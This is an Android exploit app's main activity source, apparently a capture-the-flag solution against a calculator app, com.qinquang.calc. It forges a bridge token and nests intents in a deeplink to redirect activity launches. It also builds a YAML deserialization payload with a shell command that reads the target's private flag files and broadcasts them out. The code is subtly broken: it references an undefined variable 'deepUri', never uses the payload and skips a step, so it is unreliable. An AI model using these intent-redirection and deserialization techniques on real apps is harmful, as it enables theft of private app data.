package com.qinquang.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.FileOutputStream;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitActivity";
    private static final String TARGET_PKG = "com.qinquang.calc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.exploit_button);
        exploitButton.setOnClickListener(v -> {
            try {
                triggerExploit();
                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Log.e(TAG, "Exploit failed", e);
                Toast.makeText(this, "Exploit failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    private void triggerExploit() throws Exception {
        String token = generateToken(TARGET_PKG);
        Log.d(TAG, "Generated Token: " + token);

        String command = "for f in /data/data/com.qinquang.calc/flag-*.txt; do [ -f \"$f\" ] && am broadcast -a com.qinquang.calc.FLAG --es flag \"$(cat \"$f\")\"; done";
        String yamlPayload = "!!com.qinquang.calc.PingUtil [\"" + command + "\"]";

        // === Step 1: Inner origIntent (HistoryActivity) ===
        // build inner Intent (this is the origIntent BridgeActivity will read)
        Intent inner = new Intent(Intent.ACTION_VIEW);
        inner.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.HistoryActivity")); // MUST target HistoryActivity
        inner.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // required by BridgeActivity check

        // put required extras ON THE INNER INTENT
        android.content.ContentValues cv = new android.content.ContentValues();
        cv.put("action", "process");
        cv.put("target", "history");
        cv.put("timestamp", System.currentTimeMillis());
        inner.putExtra("bridge_values", cv);

        // token must be on the inner Intent as BridgeActivity expects
        inner.putExtra("bridge_token", token);

        // optional: add debug logging of inner intent
        Log.d(TAG, "Inner origIntent (to be wrapped): " + inner.toUri(Intent.URI_INTENT_SCHEME));

        // build outer Intent that will be parsed/stored by victim MainActivity as fallback
        Intent outer = new Intent();
        outer.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.BridgeActivity")); // this outer intent will be used to start BridgeActivity
        outer.putExtra("origIntent", inner); // THIS is the crucial nesting: outer.origIntent -> inner (HistoryActivity)
        outer.putExtra("debug_marker", "exploit-v1"); // optional debug

        // serialize outer into Intent URI for deeplink expression
        String outerUri = outer.toUri(Intent.URI_INTENT_SCHEME);
        String encoded = URLEncoder.encode(outerUri, "UTF-8");
        Uri deeplink = Uri.parse("qiangcalc://calculate?expression=" + encoded);

        // === Step 3: send first deeplink ===
        Intent first = new Intent(Intent.ACTION_VIEW, deepUri);
        first.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.MainActivity"));
        first.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        Log.d(TAG, "Sending first deeplink");
        startActivity(first);

        Thread.sleep(300);

        // === Step 4: trigger the exception ===
        Uri secondUri = Uri.parse("qiangcalc://calculate?expression=1%2F0");
        Intent second = new Intent(Intent.ACTION_VIEW, secondUri);
        second.setComponent(new ComponentName(TARGET_PKG, "com.qinquang.calc.MainActivity"));
        second.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        Log.d(TAG, "Sending second deeplink");
        startActivity(second);
    }


    private String generateToken(String packageName) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(packageName.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            sb.append(String.format("%02x", hash[i]));
        }
        return sb.toString();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if (intent != null && intent.hasExtra("flag")) {
            TextView flagTextView = findViewById(R.id.flag_textview);
            String flag = intent.getStringExtra("flag");
            flagTextView.setText("FLAG: " + flag);
        }
    }
}
